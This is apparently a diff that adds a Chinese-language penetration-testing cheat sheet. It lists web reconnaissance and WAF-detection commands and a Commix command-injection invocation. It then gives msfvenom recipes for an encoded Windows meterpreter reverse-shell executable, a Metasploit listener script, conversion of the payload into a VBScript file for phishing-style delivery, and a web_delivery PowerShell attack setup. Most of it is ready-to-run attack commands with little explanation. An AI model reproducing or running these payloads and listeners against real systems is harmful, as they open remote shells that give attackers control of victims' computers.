@@ -1,0 +1,52 @@
+web应用篇
+nmap  -p 80 --script http-waf-detect.nse 域名  （识别waf存在）
+wafw00f 域名  （识别waf，精准度更高）
+lbd 域名 （检测负载均衡器）
+nc -vv ip地址 端口  (确定http服务器运行服务信息)
+BlindElephant.py 网址 joomla   (提取CMS确定版本信息)
+DirBuster (图形界面网络爬虫工具，反映网站结构)
+httrack http://域名/目录 -O 路径  （将网站内容下载到本地路径）
+crunch（支持密码破解）
+use web/pma  (msf上的web扫描、抓取和分析框架)
+WPscan (wordpress CMS专业扫描器)
+Commix -url="http://地址" -data="target_host-INJECT_HERE" -headers="Accept-Language:fr\n ETAG:123\n"
+(命令行注入，以获得对服务器的任意代码执行能力)
+
+客户端利用篇
+msfvenom -a x86 --platform windows -k -p windows/meterpreter/reverse_tcp 
+LHOST=192.168.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f exe -o encoded.exe
+利用编码器使攻击有效
+
+编写msf监听脚本：
+use windows/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.24
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+创建后终端的调用命令：
+msfconsole -q -r msf脚本文件名
+session  -i 1连接到会话
+
+生成VBscript脚本(两部分)：
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp 
+LHOST=192.168.0.1 LPORT=4444 -f vba-exe > attack.exe
+转换成vbscript文件
+cd /usr/share/metasploit-framework/tools/exploit
+ruby exe2vba.rb ~/attack.exeattack.vbs
+
+windows powershell攻击系统
+use exploit/multi/script/web_delivery
+set SRVHOST <your ip>
+set target 2
+set payload windows/meterpreter/reverse_http
+set LHOST <your ip>
+set URIPATH boom
+set payload
+exploit
+
+
+
+
+
+
